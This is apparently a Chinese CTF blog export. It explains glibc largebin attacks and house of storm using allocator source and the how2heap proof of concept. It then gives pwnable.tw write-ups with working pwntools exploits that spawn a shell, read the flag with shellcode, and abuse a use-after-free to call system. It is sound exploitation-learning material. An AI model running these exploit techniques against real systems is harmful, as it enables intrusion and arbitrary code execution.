<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=malloc(<span class="hljs-number">0</span>x<span class="hljs-number">400</span>-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>) //A<br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">10</span>)         //gap<br><span class="hljs-attribute">B</span>=malloc(<span class="hljs-number">0</span>x<span class="hljs-number">420</span>-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>) //B<br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">10</span>)         //gap<br><br><span class="hljs-attribute">free</span>(A)        //free A into unsorted bin.<br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">500</span>)  //sort A into largebin.<br><span class="hljs-attribute">free</span>(B)        //free B into unsorted bin.<br><br><span class="hljs-attribute">A</span>+<span class="hljs-number">0</span>x<span class="hljs-number">18</span>=evil_addr-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>+<span class="hljs-number">8</span>-<span class="hljs-number">5</span>  //A-&gt;bk_nextsize=evil_addr-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>+<span class="hljs-number">8</span>-<span class="hljs-number">5</span>. <br><span class="hljs-attribute">A</span>+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>=evil_addr+<span class="hljs-number">8</span>          //A-&gt;bk=evil_addr+<span class="hljs-number">8</span>.<br><br><span class="hljs-attribute">B</span>+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>=evil_addr            //B-&gt;bk=evil_addr<br><br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">48</span>)    //evil_addr are malloced out here.<br></code></pre></td></tr></table></figure>

<p>攻击代码场景如上所示，设我们想要申请的内存地址（如<code>__free_hook</code>）为<code>evil_addr</code>。攻击之前我们在largebin中布置一个堆块A，在unsorted bin中布置一个堆块B，其中B的size大于A的size，这样在插入到largebin时才会触发相应代码。</p>
<p>如上所示，我们将A的<code>bk_nextsize</code>改成了<code>evil_addr-0x20+8-5</code>，将A的<code>bk</code>改成了<code>evil_addr+8</code>，且将B的<code>bk</code>改成了<code>evil_addr</code>。</p>
<p>当执行<code>malloc(0x48)</code>时，程序会遍历unsorted bin并将unsorted bin中的chunk取下插入到相应的块中，首先将B取下，此时unsorted bin attack触发，B的<code>bk</code>指向<code>evil_addr</code>，将B从unsorted bin中取下之后，unsorted bin的bk指向了<code>evil_addr</code>。</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk; 伪造该bk指向`evil_addr`<br>...<br><span class="hljs-function"><span class="hljs-title">unsorted_chunks</span> (av)-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> = bck; //unsorted -&gt;</span> bk指向evil_addr<br><span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<p>接着就是把B插入到相应的largebin 链表中，在开启PIE的程序中，堆地址一般为0x56或0x55开头。因此我们可以利用一次写堆地址的能力往<code>evil_addr+0x8-5</code>的地址写堆的地址，使得该地址的size位为0x55或0x56。接着利用另一次写堆地址的能力往<code>evil_addr+0x18</code>的地址写堆的地址，使得该地址的bk位为堆地址，形成了如下的chunk：</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><code class="hljs nix">heap &amp;__free_hook<br>$<span class="hljs-number">1</span>=&#123;<br>  <span class="hljs-attr">prev_size</span> = xxxxxxxxxx, <br>  <span class="hljs-attr">size</span> = <span class="hljs-number">0</span>x56, <br>  <span class="hljs-attr">fd</span> = <span class="hljs-number">0</span>x0, <br>  <span class="hljs-attr">bk</span> = <span class="hljs-number">0</span>x56xxxxxxxxxxxx, <br>  <span class="hljs-attr">fd_nextsize</span> = <span class="hljs-number">0</span>, <br>  <span class="hljs-attr">bk_nextsize</span> = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>再次调用for循环取下unsorted bin时，就会取出<code>evil_addr</code>，且此时的<code>evil_addr-&gt;bk</code>为堆地址，因此可以绕过<code>bck-&gt;fd = unsorted_chunks (av)</code>限制，而<code>evil_addr</code>的大小刚好为<code>0x56</code>或<code>0x55</code>，为0x48所对应的size，所以就会被申请出来，实现了任意可写地址申请。</p>
<p>house of storm是一个任意可写地址申请漏洞。利用largebin两次写堆地址伪造出来了一个堆块，同时利用unsorted bin attack将该伪造的堆块链接到unsorted bin中，实现任意地址申请，非常的巧妙。</p>
<h2 id="高版本的利用"><a href="#高版本的利用" class="headerlink" title="高版本的利用"></a>高版本的利用</h2><p>从glibc-2.30开始，加入了两个检查，让之前的 large bin attack 发生了一些变化（似乎仅仅只是第二种方法发生了变化）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>   malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br><br>bck = fwd-&gt;bk;<br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd));<br>   malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>之前只是伪造了bk_nextsize，那么肯定是无法满足fwd-&gt;bk_nextsize-&gt;fd_nextsize == fwd；同理，也只是伪造了bk，也无法满足bck-&gt;fd == fwd。</p>
<p>分析利用源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<br>_int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes) &#123;<br>...<br>	<span class="hljs-comment">//① 遍历unsorted bin，依次取出放入对应的位置</span><br>     <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;<br>      ...<br>      <span class="hljs-comment">//② 注意main_area-&gt;last_remainder，不然直接split了</span><br>      ...<br>           <span class="hljs-keyword">if</span> (in_smallbin_range (size)) &#123;<br>             ...<br>           &#125;<br>           <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert (chunk_main_arena (bck-&gt;bk));<br>                  <span class="hljs-comment">//③ 需要走到这个分支，另一个分支已经有double link检查了，无法利用</span><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size)<br>                      &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask (bck-&gt;bk)) &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      <span class="hljs-comment">//④ 利用的关键两行代码 fwd-&gt;fd指向的是可控的内存</span><br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      ...<br>                      &#125;<br>			...<br>			&#125;<br>         &#125;<br>      &#125;<br>	      <br>...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当unsorted bin的一个chunk进入large bin时，large bin 的链表就尝试加入这个bin<br>于是就有：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize<br><br>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure>

<p>其中 fwd-&gt;fd 的chunk是攻击者控制的，其bk_nextsize可以设成(targetAddr-0x20)的位置。</p>
<p>下面是how2heap的poc。可以增加理解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A revisit to large bin attack for after glibc2.30</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Relevant code snippet :</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="hljs-comment">		fwd = bck;</span><br><span class="hljs-comment">		bck = bck-&gt;bk;</span><br><span class="hljs-comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="hljs-comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="hljs-comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">	&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span><br>  setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 1 : \n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 2 : \n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This prevents the traditional large bin attack\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);<br>  <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> target = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);<br>  <span class="hljs-keyword">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-keyword">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And another chunk to prevent consolidate\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);<br>  <span class="hljs-keyword">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-keyword">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  p1[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="hljs-number">-4</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, p1<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, (<span class="hljs-keyword">void</span> *)target);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="hljs-keyword">size_t</span>*)target);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);<br><br>  assert((<span class="hljs-keyword">size_t</span>)(p2<span class="hljs-number">-2</span>) == target);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>构造手法总结如下：</p>
<ul>
<li>ptr1 比 ptr2 大，申请了 ptr1 之后将其 free。</li>
<li>malloc 一个比 ptr1 大的 chunk，让 ptr1 进入 large bin。</li>
<li>free 掉 ptr2，将 ptr1 的 bk_nextsize 改为 target-0x20 的地址。</li>
<li>malloc 一个比 ptr2 大的 chunk，让 ptr2 进入 large bin。</li>
</ul>
<p>最终，target 上写入 ptr2 的地址。</p>
<p>至此，从 glibc-2.23到最新的glibc-2.34仍然可以使用的large bin attack 全部学习完毕了，至于如何巧妙地运用这个攻击，就要看实战了。</p>
<p>来源：</p>
<p>主要：<a href="https://ray-cp.github.io/archivers/ptmalloc_argebin_attack">https://ray-cp.github.io/archivers/ptmalloc_argebin_attack</a></p>
<p><a href="https://blog.csdn.net/qq_23066945/article/details/103070322">https://blog.csdn.net/qq_23066945/article/details/103070322</a></p>
<p><a href="https://blog.csdn.net/easy_level1/article/details/117445936#t4">https://blog.csdn.net/easy_level1/article/details/117445936#t4</a></p>
]]></content>
      <tags>
        <tag>largebin</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw</title>
    <url>/2021/11/08/2021-11-08-pwnable-tw/</url>
    <content><![CDATA[<p>某个大佬说过，pwnable.tw的题目rank比较高，要把这里的题目都刷一遍，才算是有基础可以进行漏洞挖掘，学pwn也快一年了，今天开始慢慢地把这里的题目一一进行复现，然后再去学习漏洞挖掘的相关知识，同时这里题目质量高，CTF的帮助应该也很大 ，加油吧，👶还期待着成为👴的那天</p>
<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>这题在buu上做过，不细说了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10000</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;Let&#x27;s start the CTF:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(payload)<br>addr = u32(p.recv(<span class="hljs-number">4</span>)) + <span class="hljs-number">0x14</span><br>log.info(<span class="hljs-built_in">hex</span>(addr))<br>shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor eax,eax       </span><br><span class="hljs-string">xor edx,edx			</span><br><span class="hljs-string">push edx				</span><br><span class="hljs-string">push 0x68732f2f       </span><br><span class="hljs-string">push 0x6e69622f       </span><br><span class="hljs-string">mov ebx,esp           </span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">mov al,0xB           </span><br><span class="hljs-string">int 0x80               </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(addr) + asm(shellcode)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20211109203654763.png"><span class="image-caption">image-20211109203654763</span></p>
<p>checksec一下，32位，只开了Canary</p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20211109203821716.png"><span class="image-caption">image-20211109203821716</span></p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20211109203905145.png"><span class="image-caption">image-20211109203905145</span></p>
<p>程序很简单，开了个沙箱，然后就是输入shellcode，并且帮你执行。沙箱允许执行open、read、write</p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20211109204349251.png"><span class="image-caption">image-20211109204349251</span></p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20211109204410933.png"><span class="image-caption">image-20211109204410933</span></p>
<p>写入的地址也是可写可执行的，所以直接写入orw的shellcode执行即可，但是要注意，flag在/home/orw/flag，然后为了四字节对齐，可以写两个0x2f，毕竟两个//这个是没有影响的</p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20211109205838679.png"><span class="image-caption">image-20211109205838679</span></p>
<p>成功！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10001</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	push 0x0;</span><br><span class="hljs-string">	push 0x67616c66;</span><br><span class="hljs-string">	push 0x2f77726f;</span><br><span class="hljs-string">	push 0x2f2f656d;</span><br><span class="hljs-string">	push 0x6f682f2f;</span><br><span class="hljs-string">	mov ebx,esp;</span><br><span class="hljs-string">	xor ecx,ecx;</span><br><span class="hljs-string">	xor edx,edx;</span><br><span class="hljs-string">	mov eax,0x5;</span><br><span class="hljs-string">	int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov ebx,eax;</span><br><span class="hljs-string">	mov eax,0x3;</span><br><span class="hljs-string">	mov ecx,esp;</span><br><span class="hljs-string">	mov edx,0x50;</span><br><span class="hljs-string">	int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov eax,0x4;</span><br><span class="hljs-string">	mov ebx,0x1;</span><br><span class="hljs-string">	int 0x80</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>    )<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>这题在BUU上也做过了，直接贴wp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h2><p>checksec一下，64位，保护全开。</p>
<p>deadbeef是在login里面进行输入的内容，而八个b则是在copy功能里面输入的，可以看见，这两个输入是存在连续空间的，所以是可以在login里面输入好数据，让strcpy一直不断往下的复制，从而覆盖到返回地址。这里填入的deadbeef是通过’\x00’截断的，但是这显然是无用的，因为就算覆盖了返回地址，但是我们缺少了libc地址，也无法成功getshell，所以需要泄露地址，此时的login函数里面的漏洞就派上用场，可以进行由我们自主控制长度的进行不断地爆破，从而可以逐字节爆破出随机数以及后面存放在栈上的libc地址。</p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20220313215126094.png"><span class="image-caption">image-20220313215126094</span></p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20220313225030746.png"><span class="image-caption">image-20220313225030746</span></p>
<p><img src="/2021/11/08/2021-11-08-pwnable-tw/image-20220313225146974.png"><span class="image-caption">image-20220313225146974</span></p>
]]></content>
      <tags>
        <tag>PWN,pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>_IO_FLIE</title>
    <url>/2021/11/06/2021-11-06-IO-FLIE/</url>
    <content><![CDATA[<h1 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h1><p>介绍的函数都是glibc-2.23及以下适用，后面的内容才会介绍高版本的利用，但是也是在这个基础上对新检查的对抗与绕过</p>
<h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h1><h2 id="主要函数功能介绍"><a href="#主要函数功能介绍" class="headerlink" title="主要函数功能介绍"></a>主要函数功能介绍</h2><p><strong>FILE *fopen(const char *filename,  const char *mode)</strong></p>
<p>使用给定的模式 <strong>mode</strong> 打开 <strong>filename</strong> 所指向的文件，返回一个文件指针fp，fp指向存储在<strong>堆上</strong>的FILE结构体。如果打开失败则返回NULL</p>
<p><strong>size_t fread(void *ptr,  size_t size,  size_t nmemb,  FILE *stream)</strong></p>
<p> 从给定流 <strong>stream</strong> 读取数据到 <strong>ptr</strong> 所指向的数组中，返回成功读取的对象个数，若出现错误或到达文件末尾，则可能小于count</p>
<p><strong>size_t fwrite(const void *ptr,  size_t size,  size_t nmemb,  FILE *stream)</strong></p>
<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中，返回实际写入的数据块数目</p>
<p><strong>int fclose(FILE *stream)</strong></p>
<p>关闭文件流，并且释放相应文件指针指向的缓冲区（堆块）</p>
<h2 id="主要结构体介绍"><a href="#主要结构体介绍" class="headerlink" title="主要结构体介绍"></a>主要结构体介绍</h2><p>当使用fopen打开一个文件，会在堆上分配一块内存用来存储_IO_FILE_plus结构体，FILE结构体有两个成员<code>_IO_FILE</code>以及<code>_IO_jump_t</code>，这两个成员也是结构体。如下源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    _IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>_IO_FILE存储着一些文件相关的指针信息，该结构体的大小：64位下的长度为0xd8； 32位下的长度为0x94。源码如下：</p>
